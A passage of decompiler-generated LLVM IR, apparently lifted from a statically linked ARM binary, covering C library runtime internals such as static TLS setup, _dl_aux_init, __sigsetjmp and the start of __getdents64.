  store i32 %v4_21148, i32* @lr, align 4
  store i32 %v2_2112c, i32* %r1.global-to-local, align 4
  %v1_21190 = inttoptr i32 %v4_21148 to i32*
  %v2_2119061 = load i32, i32* %v1_21190, align 4
  %v4_2119462 = mul i32 %v2_2119061, 32
  %v5_2119463 = add i32 %v4_2119462, %v2_2112c
  store i32 %v5_2119463, i32* %r3.global-to-local, align 4
  %v3_2119865 = icmp ult i32 %v2_2112c, %v5_2119463
  br i1 %v3_2119865, label %dec_label_pc_21154, label %dec_label_pc_21304.loopexit

dec_label_pc_21154:                               ; preds = %dec_label_pc_21144, %dec_label_pc_2118c
  %v0_2116c66 = phi i32 [ %v1_2118c, %dec_label_pc_2118c ], [ %v2_2112c, %dec_label_pc_21144 ]
  %v1_21154 = inttoptr i32 %v0_2116c66 to i32*
  %v2_21154 = load i32, i32* %v1_21154, align 4
  store i32 %v2_21154, i32* %r3.global-to-local, align 4
  %v7_21158 = icmp eq i32 %v2_21154, 7
  br i1 %v7_21158, label %dec_label_pc_21160, label %dec_label_pc_2118c

dec_label_pc_21160:                               ; preds = %dec_label_pc_21154
  %v1_21160 = add i32 %v0_2116c66, 20
  %v2_21160 = inttoptr i32 %v1_21160 to i32*
  %v3_21160 = load i32, i32* %v2_21160, align 4
  store i32 %v3_21160, i32* %r3.global-to-local, align 4
  %v1_21164 = add i32 %v0_2116c66, 28
  %v2_21164 = inttoptr i32 %v1_21164 to i32*
  %v3_21164 = load i32, i32* %v2_21164, align 4
  store i32 %v3_21164, i32* @r6, align 4
  %v1_2116c = add i32 %v0_2116c66, 16
  %v2_2116c = inttoptr i32 %v1_2116c to i32*
  %v3_2116c = load i32, i32* %v2_2116c, align 4
  store i32 %v3_2116c, i32* %r3.global-to-local, align 4
  %v1_21170 = add i32 %v0_2116c66, 8
  %v2_21170 = inttoptr i32 %v1_21170 to i32*
  %v3_21170 = load i32, i32* %v2_21170, align 4
  store i32 %v3_21170, i32* %r1.global-to-local, align 4
  %tmp78 = icmp ule i32 %v3_21164, %v0_2113c
  %v0_2113c.v3_21164 = select i1 %tmp78, i32 %v0_2113c, i32 %v3_21164
  store i32 %v0_2113c.v3_21164, i32* %fp.global-to-local, align 4
  %v2_211a8 = icmp eq i32 %v3_21164, 0
  br i1 %v2_211a8, label %dec_label_pc_211d0, label %bb

dec_label_pc_2118c:                               ; preds = %dec_label_pc_21154
  %v1_2118c = add i32 %v0_2116c66, 32
  store i32 %v1_2118c, i32* %r1.global-to-local, align 4
  %v2_21190 = load i32, i32* %v1_21190, align 4
  %v4_21194 = mul i32 %v2_21190, 32
  %v5_21194 = add i32 %v4_21194, %v2_2112c
  store i32 %v5_21194, i32* %r3.global-to-local, align 4
  %v3_21198 = icmp ult i32 %v1_2118c, %v5_21194
  br i1 %v3_21198, label %dec_label_pc_21154, label %dec_label_pc_21190.dec_label_pc_21304.loopexit_crit_edge

bb:                                               ; preds = %dec_label_pc_21160
  %v2_211ac = add i32 %v3_21164, -1
  br label %dec_label_pc_211d4

dec_label_pc_211d0:                               ; preds = %dec_label_pc_21160, %dec_label_pc_21304
  %v0_211e4.pre = phi i32 [ %v0_211e4.pre.pre, %dec_label_pc_21304 ], [ ptrtoint (i32* @global_var_2c010.418 to i32), %dec_label_pc_21160 ]
  %v1_211d4.pre = phi i32 [ %v1_211d4.pre.pre, %dec_label_pc_21304 ], [ %v0_21138, %dec_label_pc_21160 ]
  %v1_211f825 = phi i32 [ %v0_2130c, %dec_label_pc_21304 ], [ %v0_2113c.v3_21164, %dec_label_pc_21160 ]
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_21304 ], [ %v3_21160, %dec_label_pc_21160 ]
  %stack_var_-48.0 = phi i32 [ 0, %dec_label_pc_21304 ], [ %v3_2116c, %dec_label_pc_21160 ]
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_21304 ], [ %v3_21170, %dec_label_pc_21160 ]
  br label %dec_label_pc_211d4

dec_label_pc_211d4:                               ; preds = %bb, %dec_label_pc_211d0
  %storemerge80 = phi i32 [ %v2_211ac, %bb ], [ 0, %dec_label_pc_211d0 ]
  %v0_211d4 = phi i32 [ %v2_211ac, %bb ], [ 0, %dec_label_pc_211d0 ]
  %storemerge = phi i32 [ %v3_21164, %bb ], [ 1, %dec_label_pc_211d0 ]
  %storemerge79 = phi i32 [ %v3_21164, %bb ], [ 1, %dec_label_pc_211d0 ]
  %v0_211e4 = phi i32 [ ptrtoint (i32* @global_var_2c010.418 to i32), %bb ], [ %v0_211e4.pre, %dec_label_pc_211d0 ]
  %v1_211d4 = phi i32 [ %v0_21138, %bb ], [ %v1_211d4.pre, %dec_label_pc_211d0 ]
  %v1_211f8 = phi i32 [ %v0_2113c.v3_21164, %bb ], [ %v1_211f825, %dec_label_pc_211d0 ]
  %stack_var_-52.3 = phi i32 [ %v3_21160, %bb ], [ %stack_var_-52.0, %dec_label_pc_211d0 ]
  %stack_var_-48.3 = phi i32 [ %v3_2116c, %bb ], [ %stack_var_-48.0, %dec_label_pc_211d0 ]
  %stack_var_-44.3 = phi i32 [ %v3_21170, %bb ], [ %stack_var_-44.0, %dec_label_pc_211d0 ]
  store i32 %storemerge80, i32* %r0.global-to-local, align 4
  store i32 %storemerge79, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v2_211d4 = add i32 %v1_211d4, %v0_211d4
  %v2_211d8 = udiv i32 %v2_211d4, %storemerge
  store i32 %v2_211d8, i32* %r0.global-to-local, align 4
  %v2_211dc = mul i32 %v2_211d8, %storemerge
  store i32 %v2_211dc, i32* %sb.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v2_211e4 = add i32 %v0_211e4, 72
  %v3_211e4 = inttoptr i32 %v2_211e4 to i32*
  %v4_211e4 = load i32, i32* %v3_211e4, align 4
  store i32 %v4_211e4, i32* %r3.global-to-local, align 4
  %v1_211e8 = inttoptr i32 %v4_211e4 to i32*
  %v2_211e8 = load i32, i32* %v1_211e8, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v1_211f0 = add i32 %v1_211f8, 1168
  %v2_211f4 = add i32 %v1_211f0, %stack_var_-52.3
  %v2_211f8 = add i32 %v2_211f4, %v2_211dc
  %v2_211fc = add i32 %v2_211f8, %v2_211e8
  store i32 %v2_211fc, i32* %r0.global-to-local, align 4
  %v1_21200 = call i32 @__GI_sbrk(i32 %v2_211fc)
  %v1_21204 = load i32, i32* %fp.global-to-local, align 4
  %v1_2120c = sub i32 0, %v1_21204
  store i32 10276, i32* %r4.global-to-local, align 4
  %v2_21204 = add i32 %v1_21200, 1167
  %v1_21214 = add i32 %v2_21204, %v1_21204
  %v2_21218 = and i32 %v1_21214, %v1_2120c
  store i32 %v2_21218, i32* @r5, align 4
  %v1_21220 = load i32, i32* %sl.global-to-local, align 4
  %v3_21220 = add i32 %v1_21220, 10276
  %v4_21220 = inttoptr i32 %v3_21220 to i32*
  store i32 62, i32* %v4_21220, align 4
  %v0_21228 = load i32, i32* @r5, align 4
  %v1_21228 = load i32, i32* %sb.global-to-local, align 4
  %v2_21228 = add i32 %v1_21228, %v0_21228
  store i32 %v2_21228, i32* @ip, align 4
  %v0_2122c = load i32, i32* %sl.global-to-local, align 4
  %v1_2122c = load i32, i32* %r4.global-to-local, align 4
  %v2_2122c = add i32 %v1_2122c, %v0_2122c
  store i32 %v2_2122c, i32* %r4.global-to-local, align 4
  %v2_21230 = add i32 %v0_2122c, 11564
  store i32 %v2_21230, i32* %r8.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  store i32 %stack_var_-44.3, i32* @r1, align 4
  store i32 %stack_var_-48.3, i32* @r2, align 4
  store i32 %v2_21228, i32* @r0, align 4
  %v2_21244 = add i32 %v2_2122c, 16
  %v3_21244 = inttoptr i32 %v2_21244 to i32*
  store i32 %v2_21228, i32* %v3_21244, align 4
  %v0_21248 = load i32, i32* %sb.global-to-local, align 4
  %v1_21248 = load i32, i32* %r8.global-to-local, align 4
  %v2_21248 = add i32 %v1_21248, 40
  %v3_21248 = inttoptr i32 %v2_21248 to i32*
  store i32 %v0_21248, i32* %v3_21248, align 4
  %v0_2124c = load i32, i32* @r3, align 4
  %v1_2124c = trunc i32 %v0_2124c to i8
  %v2_2124c = load i32, i32* %r4.global-to-local, align 4
  %v3_2124c = add i32 %v2_2124c, 20
  %v4_2124c = inttoptr i32 %v3_2124c to i8*
  store i8 %v1_2124c, i8* %v4_2124c, align 1
  %v0_21250 = load i32, i32* %r4.global-to-local, align 4
  %v1_21250 = add i32 %v0_21250, 8
  store i32 %v1_21250, i32* @r4, align 4
  %v0_21254 = call i32 @memcpy()
  %v0_2125c = load i32, i32* @r4, align 4
  %v1_2125c = load i32, i32* @r5, align 4
  %v2_2125c = inttoptr i32 %v1_2125c to i32*
  store i32 %v0_2125c, i32* %v2_2125c, align 4
  %v0_21260 = load i32, i32* @r5, align 4
  store i32 %v0_21260, i32* %r0.global-to-local, align 4
  %tmp = icmp ugt i32 %v0_21260, -4096
  call void @__pseudo_cond_branch(i1 %tmp, i32 ptrtoint (i32* @global_var_1c964.613 to i32))
  store i32 84, i32* %r3.global-to-local, align 4
  %v0_21274 = load i32, i32* %sl.global-to-local, align 4
  %v2_21274 = add i32 %v0_21274, 84
  %v3_21274 = inttoptr i32 %v2_21274 to i32*
  %v4_21274 = load i32, i32* %v3_21274, align 4
  store i32 %v4_21274, i32* %ip.global-to-local, align 4
  store i32 60, i32* %r3.global-to-local, align 4
  store i32 10788, i32* %r1.global-to-local, align 4
  %v2_21280 = add i32 %v0_21274, 60
  %v3_21280 = inttoptr i32 %v2_21280 to i32*
  %v4_21280 = load i32, i32* %v3_21280, align 4
  store i32 %v4_21280, i32* %r0.global-to-local, align 4
  %v3_21288 = add i32 %v0_21274, 10788
  %v4_21288 = inttoptr i32 %v3_21288 to i32*
  store i32 64, i32* %v4_21288, align 4
  %v1_21290 = load i32, i32* %r8.global-to-local, align 4
  %v2_21290 = add i32 %v1_21290, 20
  %v3_21290 = inttoptr i32 %v2_21290 to i32*
  store i32 %stack_var_-44.3, i32* %v3_21290, align 4
  %v1_21298 = load i32, i32* %r8.global-to-local, align 4
  %v2_21298 = add i32 %v1_21298, 24
  %v3_21298 = inttoptr i32 %v2_21298 to i32*
  store i32 %stack_var_-48.3, i32* %v3_21298, align 4
  %v1_212a0 = load i32, i32* %r0.global-to-local, align 4
  %v2_212a0 = inttoptr i32 %v1_212a0 to i32*
  store i32 1, i32* %v2_212a0, align 4
  %v1_212a8 = load i32, i32* %r8.global-to-local, align 4
  %v2_212a8 = add i32 %v1_212a8, 28
  %v3_212a8 = inttoptr i32 %v2_212a8 to i32*
  store i32 %stack_var_-52.3, i32* %v3_212a8, align 4
  %v0_212b0 = load i32, i32* @r6, align 4
  %v2_212b0 = icmp eq i32 %v0_212b0, 0
  %v1_212b4 = load i32, i32* %r8.global-to-local, align 4
  %v2_212b4 = add i32 %v1_212b4, 44
  %v3_212b4 = inttoptr i32 %v2_212b4 to i32*
  store i32 1, i32* %v3_212b4, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v0_212bc = load i32, i32* %sl.global-to-local, align 4
  %v1_212bc = load i32, i32* %r1.global-to-local, align 4
  %v2_212bc = add i32 %v1_212bc, %v0_212bc
  store i32 %v2_212bc, i32* %r2.global-to-local, align 4
  %v1_212c0 = load i32, i32* @r6, align 4
  br i1 %v2_212b0, label %.thread33, label %bb52

.thread33:                                        ; preds = %dec_label_pc_211d4
  store i32 %v1_212c0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_212cc34 = load i32, i32* %r8.global-to-local, align 4
  %v2_212cc35 = add i32 %v1_212cc34, 32
  %v3_212cc36 = inttoptr i32 %v2_212cc35 to i32*
  store i32 %v1_212c0, i32* %v3_212cc36, align 4
  br label %bb53

bb52:                                             ; preds = %dec_label_pc_211d4
  %v2_212c4 = add i32 %v1_212c0, -1
  store i32 %v2_212c4, i32* %r0.global-to-local, align 4
  %v1_212cc = load i32, i32* %r8.global-to-local, align 4
  %v2_212cc = add i32 %v1_212cc, 32
  %v3_212cc = inttoptr i32 %v2_212cc to i32*
  store i32 %v1_212c0, i32* %v3_212cc, align 4
  %v1_212d0 = load i32, i32* @r6, align 4
  store i32 %v1_212d0, i32* %r1.global-to-local, align 4
  br label %bb53

bb53:                                             ; preds = %.thread33, %bb52
  %v0_212d4 = load i32, i32* %r8.global-to-local, align 4
  %v1_212d4 = load i32, i32* %r2.global-to-local, align 4
  %v2_212d4 = add i32 %v1_212d4, 28
  %v3_212d4 = inttoptr i32 %v2_212d4 to i32*
  store i32 %v0_212d4, i32* %v3_212d4, align 4
  %v0_212d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_212d8 = load i32, i32* %ip.global-to-local, align 4
  %v2_212d8 = inttoptr i32 %v1_212d8 to i32*
  store i32 %v0_212d8, i32* %v2_212d8, align 4
  %v0_212dc = load i32, i32* %r0.global-to-local, align 4
  %v1_212dc = load i32, i32* %r3.global-to-local, align 4
  %v2_212dc = add i32 %v1_212dc, %v0_212dc
  store i32 %v2_212dc, i32* %r0.global-to-local, align 4
  %v1_212e0 = load i32, i32* %r1.global-to-local, align 4
  br i1 %v2_212b0, label %bb54, label %._crit_edge

._crit_edge:                                      ; preds = %bb53
  %v0_212e8.pre = load i32, i32* @r6, align 4
  br label %bb55

bb54:                                             ; preds = %bb53
  br label %bb55

bb55:                                             ; preds = %._crit_edge, %bb54
  %v0_212e8 = phi i32 [ %v0_212e8.pre, %._crit_edge ], [ %v1_212e0, %bb54 ]
  %v2_212e4 = udiv i32 %v2_212dc, %v1_212e0
  %v2_212e8 = load i32, i32* %sb.global-to-local, align 4
  %v3_212e8 = mul i32 %v2_212e4, %v0_212e8
  %v4_212e8 = add i32 %v2_212e8, %v3_212e8
  store i32 %v4_212e8, i32* @r0, align 4
  %v0_212ec = load i32, i32* %fp.global-to-local, align 4
  %v2_212ec = icmp ult i32 %v0_212ec, 16
  %v0_212ec. = select i1 %v2_212ec, i32 16, i32 %v0_212ec
  store i32 %v0_212ec., i32* @r1, align 4
  %v2_212fc = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_212fc, i32* @r4, align 4
  store i32 %v6_21118, i32* @r5, align 4
  store i32 %v15_21118, i32* %r8.global-to-local, align 4
  store i32 %v18_21118, i32* %sb.global-to-local, align 4
  store i32 %v21_21118, i32* %sl.global-to-local, align 4
  store i32 %v24_21118, i32* %fp.global-to-local, align 4
  store i32 %v27_21118, i32* @lr, align 4
  %v0_21300 = call i32 @init_static_tls()
  store i32 %v0_21300, i32* %r0.global-to-local, align 4
  %v0_2130c.pre = load i32, i32* @ip, align 4
  %v1_211d4.pre.pre.pre = load i32, i32* @r5, align 4
  %v0_211e4.pre.pre.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_21304

dec_label_pc_21190.dec_label_pc_21304.loopexit_crit_edge: ; preds = %dec_label_pc_2118c
  br label %dec_label_pc_21304.loopexit

dec_label_pc_21304.loopexit:                      ; preds = %dec_label_pc_21190.dec_label_pc_21304.loopexit_crit_edge, %dec_label_pc_21144
  br label %dec_label_pc_21304

dec_label_pc_21304:                               ; preds = %dec_label_pc_21304.loopexit, %entry, %bb55
  %v0_211e4.pre.pre = phi i32 [ ptrtoint (i32* @global_var_2c010.418 to i32), %dec_label_pc_21304.loopexit ], [ ptrtoint (i32* @global_var_2c010.418 to i32), %entry ], [ %v0_211e4.pre.pre.pre, %bb55 ]
  %v1_211d4.pre.pre = phi i32 [ %v0_21138, %dec_label_pc_21304.loopexit ], [ %v0_21138, %entry ], [ %v1_211d4.pre.pre.pre, %bb55 ]
  %v0_2130c = phi i32 [ %v0_2113c, %dec_label_pc_21304.loopexit ], [ %v0_2113c, %entry ], [ %v0_2130c.pre, %bb55 ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 %v0_2130c, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_211d0

; uselistorder directives
  uselistorder i32 %v0_2130c, { 1, 0 }
  uselistorder i32 %v1_212c0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_2122c, { 1, 0 }
  uselistorder i32 %v2_21228, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.3, { 1, 2, 0, 3 }
  uselistorder i32 %v1_2118c, { 2, 1, 0 }
  uselistorder i32 %v3_21164, { 1, 0, 4, 5, 3, 2, 6 }
  uselistorder i32 %v0_2116c66, { 4, 1, 0, 3, 2, 5 }
  uselistorder i32* %v1_21190, { 1, 0 }
  uselistorder i32 %v0_2113c, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v0_21138, { 1, 2, 0, 3 }
  uselistorder i32 %v2_2112c, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 12, 9, 10, 11, 0, 13, 14, 15 }
  uselistorder i32* %r1.global-to-local, { 5, 4, 6, 7, 8, 0, 10, 9, 3, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 5, 7, 6, 8, 9, 10, 11, 12, 3, 0, 1, 2 }
  uselistorder i32 ()* @init_static_tls, { 1, 0 }
  uselistorder i32 10788, { 0, 2, 1 }
  uselistorder i32 84, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 -4096, { 0, 2, 1, 4, 3, 6, 5, 7, 8 }
  uselistorder i32 62, { 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_sbrk, { 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_21304, { 0, 2, 1 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %bb53, { 1, 0 }
  uselistorder label %dec_label_pc_211d4, { 1, 0 }
  uselistorder label %dec_label_pc_211d0, { 1, 0 }
  uselistorder label %dec_label_pc_21154, { 1, 0 }
}

define i32 @function_21324(i32 %arg1) local_unnamed_addr {
dec_label_pc_21324:
  %v0_21324 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_21324, label %bb, label %.thread7

bb:                                               ; preds = %dec_label_pc_21324
  %v1_21328 = load i32, i32* @ip, align 4
  %v2_21330 = load i32, i32* @r4, align 4
  %v1_21338 = load i32, i32* @r5, align 4
  %v2_21338 = and i32 %v1_21328, 136000
  %v9_2133c = and i32 %v2_21338, %v2_21330
  %v9_21340 = and i32 %v9_2133c, %v1_21338
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_21324, %bb
  %v7_21344 = phi i32 [ %arg1, %dec_label_pc_21324 ], [ %v9_21340, %bb ]
  ret i32 %v7_21344

; uselistorder directives
  uselistorder label %.thread7, { 1, 0 }
}

define i32 @__pthread_initialize_minimal() local_unnamed_addr {
entry:
  %v2_21350 = call i32 @__libc_setup_tls(i32 8, i32 16)
  ret i32 %v2_21350
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* %r2.global-to-local, align 4
  %v4_21360 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 156) to i32*), align 4
  %v4_21368 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 104) to i32*), align 4
  store i32 %v4_21368, i32* %r1.global-to-local, align 4
  %v1_2136c = add i32 %arg1, 44
  %v2_2136c = inttoptr i32 %v1_2136c to i32*
  %v3_2136c = load i32, i32* %v2_2136c, align 4
  %v1_21370 = add i32 %arg1, 28
  %v2_21370 = inttoptr i32 %v1_21370 to i32*
  %v3_21370 = load i32, i32* %v2_21370, align 4
  store i32 %v3_21370, i32* %r2.global-to-local, align 4
  %v2_21374 = inttoptr i32 %v4_21360 to i32*
  store i32 %v3_2136c, i32* %v2_21374, align 4
  %v0_21378 = load i32, i32* %r2.global-to-local, align 4
  %v1_21378 = load i32, i32* %r1.global-to-local, align 4
  %v2_21378 = inttoptr i32 %v1_21378 to i32*
  store i32 %v0_21378, i32* %v2_21378, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 104, { 0, 1, 2, 6, 7, 3, 4, 5 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 156) to i32*), { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_21384(i32 %arg1) local_unnamed_addr {
dec_label_pc_21384:
  %v0_21384 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_21384, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_21384
  %v1_21384 = load i32, i32* @ip, align 4
  %v3_21384 = mul i32 %v1_21384, %arg1
  %v2_21388 = load i32, i32* @r8, align 4
  %v4_21388 = and i32 %v2_21388, %v3_21384
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_21384, %bb
  %v5_21388 = phi i32 [ %arg1, %dec_label_pc_21384 ], [ %v4_21388, %bb ]
  ret i32 %v5_21388

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_dl_nothread_init_static_tls(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %v1_21394 = add i32 %arg1, 40
  store i32 %v1_21394, i32* %r2.global-to-local, align 4
  %v1_21398 = inttoptr i32 %v1_21394 to i32*
  %v2_21398 = load i32, i32* %v1_21398, align 4
  store i32 %v2_21398, i32* %r2.global-to-local, align 4
  %v3_21398 = add i32 %arg1, 44
  %v4_21398 = inttoptr i32 %v3_21398 to i32*
  %v5_21398 = load i32, i32* %v4_21398, align 4
  store i32 %v5_21398, i32* %r3.global-to-local, align 4
  %v0_2139c = call i32 @__aeabi_read_tp()
  %v1_213a0 = inttoptr i32 %v0_2139c to i32*
  %v2_213a0 = load i32, i32* %v1_213a0, align 4
  store i32 %v2_213a0, i32* %r1.global-to-local, align 4
  %v3_213a4 = mul i32 %v5_21398, 8
  store i32 %v3_213a4, i32* %r3.global-to-local, align 4
  %v1_213a8 = load i32, i32* %r2.global-to-local, align 4
  %v2_213a8 = add i32 %v1_213a8, %v0_2139c
  %v3_213ac = add i32 %v3_213a4, %v2_213a0
  %v4_213ac = inttoptr i32 %v3_213ac to i32*
  store i32 %v2_213a8, i32* %v4_213ac, align 4
  %v0_213b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_213b0 = load i32, i32* %r1.global-to-local, align 4
  %v2_213b0 = add i32 %v1_213b0, %v0_213b0
  store i32 %v2_213b0, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v4_213b8 = add i32 %v2_213b0, 4
  %v5_213b8 = inttoptr i32 %v4_213b8 to i8*
  store i8 1, i8* %v5_213b8, align 1
  %v0_213bc = load i32, i32* @r4, align 4
  %v1_213bc = add i32 %v0_213bc, 20
  store i32 %v1_213bc, i32* %r1.global-to-local, align 4
  %v1_213c0 = inttoptr i32 %v1_213bc to i32*
  %v2_213c0 = load i32, i32* %v1_213c0, align 4
  store i32 %v2_213c0, i32* @r1, align 4
  %v3_213c0 = add i32 %v0_213bc, 24
  %v4_213c0 = inttoptr i32 %v3_213c0 to i32*
  %v5_213c0 = load i32, i32* %v4_213c0, align 4
  store i32 %v5_213c0, i32* %r2.global-to-local, align 4
  %v5_213c4 = call i32 @__GI_mempcpy(i32 %v2_213a8, i32 %v2_213c0, i32 %v5_213c0, i32 1)
  %v0_213c8 = load i32, i32* @r4, align 4
  %v1_213c8 = add i32 %v0_213c8, 28
  store i32 %v1_213c8, i32* %r3.global-to-local, align 4
  %v1_213cc = inttoptr i32 %v1_213c8 to i32*
  %v2_213cc = load i32, i32* %v1_213cc, align 4
  store i32 %v2_213cc, i32* %r2.global-to-local, align 4
  %v3_213cc = add i32 %v0_213c8, 24
  %v4_213cc = inttoptr i32 %v3_213cc to i32*
  %v5_213cc = load i32, i32* %v4_213cc, align 4
  store i32 %v5_213cc, i32* %r3.global-to-local, align 4
  %v2_213d0 = sub i32 %v5_213cc, %v2_213cc
  store i32 %v2_213d0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_213d8 = inttoptr i32 %v5_213c4 to i8*
  %v4_213d8 = call i32 @__GI_memset(i8* %v3_213d8, i32 0, i32 %v2_213d0)
  ret i32 %v4_213d8

; uselistorder directives
  uselistorder i32 %v3_213a4, { 1, 0 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 0, 1, 2, 3, 10, 4, 15, 14, 11, 5, 6, 7, 8, 9, 12, 13 }
  uselistorder i32 (i32, i32, i32, i32)* @__GI_mempcpy, { 1, 0 }
  uselistorder i8 1, { 12, 0, 1, 2, 9, 13, 3, 4, 5, 11, 14, 8, 10, 15, 6, 16, 17, 18, 19, 20, 21, 7, 22, 25, 23, 24, 27, 28, 29, 30, 31, 26, 32 }
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
dec_label_pc_21428:
  store i32 %arg1, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 11616) to i32*), align 4
  ret i32 0
}

define i32 @__sigsetjmp() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v0_2143c = load i32, i32* @r0, align 4
  %v1_21440 = inttoptr i32 %v0_2143c to i32*
  %v2_21440 = load i32, i32* @r4, align 4
  store i32 %v2_21440, i32* %v1_21440, align 4
  %v3_21440 = add i32 %v0_2143c, 4
  %v4_21440 = inttoptr i32 %v3_21440 to i32*
  %v5_21440 = load i32, i32* @r5, align 4
  store i32 %v5_21440, i32* %v4_21440, align 4
  %v6_21440 = add i32 %v0_2143c, 8
  %v7_21440 = inttoptr i32 %v6_21440 to i32*
  %v8_21440 = load i32, i32* @r6, align 4
  store i32 %v8_21440, i32* %v7_21440, align 4
  %v9_21440 = add i32 %v0_2143c, 12
  %v10_21440 = inttoptr i32 %v9_21440 to i32*
  %v11_21440 = load i32, i32* @r7, align 4
  store i32 %v11_21440, i32* %v10_21440, align 4
  %v12_21440 = add i32 %v0_2143c, 16
  %v13_21440 = inttoptr i32 %v12_21440 to i32*
  %v14_21440 = load i32, i32* @r8, align 4
  store i32 %v14_21440, i32* %v13_21440, align 4
  %v15_21440 = add i32 %v0_2143c, 20
  %v16_21440 = inttoptr i32 %v15_21440 to i32*
  %v17_21440 = load i32, i32* @sb, align 4
  store i32 %v17_21440, i32* %v16_21440, align 4
  %v18_21440 = add i32 %v0_2143c, 24
  %v19_21440 = inttoptr i32 %v18_21440 to i32*
  %v20_21440 = load i32, i32* @sl, align 4
  store i32 %v20_21440, i32* %v19_21440, align 4
  %v21_21440 = add i32 %v0_2143c, 28
  %v22_21440 = inttoptr i32 %v21_21440 to i32*
  %v23_21440 = load i32, i32* @fp, align 4
  store i32 %v23_21440, i32* %v22_21440, align 4
  %v24_21440 = add i32 %v0_2143c, 32
  %v25_21440 = inttoptr i32 %v24_21440 to i32*
  %v27_21440 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v27_21440, i32* %v25_21440, align 4
  %v28_21440 = add i32 %v0_2143c, 36
  %v29_21440 = inttoptr i32 %v28_21440 to i32*
  %v30_21440 = load i32, i32* @lr, align 4
  store i32 %v30_21440, i32* %v29_21440, align 4
  %v0_21444 = call i32 @__sigjmp_save()
  ret i32 %v0_21444

; uselistorder directives
  uselistorder i32 %v0_2143c, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @fp, { 124, 125, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 86, 87, 88, 89, 99, 101, 100, 102, 0, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 12, 13, 14, 116, 117, 118, 119, 15, 74, 75, 76, 16, 17, 18, 77, 78, 79, 19, 20, 21, 22, 23, 24, 25, 26, 27, 80, 81, 32, 33, 82, 83, 84, 28, 29, 30, 96, 97, 34, 35, 36, 37, 38, 39, 40, 41, 31, 42, 45, 46, 47, 48, 49, 50, 51, 52, 53, 43, 44, 54, 55, 56, 58, 59, 60, 57, 61, 62, 63, 64, 65, 66, 67, 68, 90, 91, 92, 69, 70, 120, 121, 122, 71, 72, 73, 85, 93, 94, 95, 98, 123, 1 }
}

define i32 @__getdents64(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v6_2144c = load i32, i32* @r5, align 4
  %v12_2144c = load i32, i32* @r7, align 4
  %v1_21450 = add i32 %arg3, 14
  %v2_21458 = ptrtoint i32* %stack_var_-72 to i32
  %v1_2145c = and i32 %v1_21450, -8
  %v2_21460 = sub i32 %v2_21458, %v1_2145c
  %v1_21464 = add i32 %v2_21460, 8
  store i32 %tmp, i32* %sl.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %tmp23 = icmp ult i32 %arg1, -4095
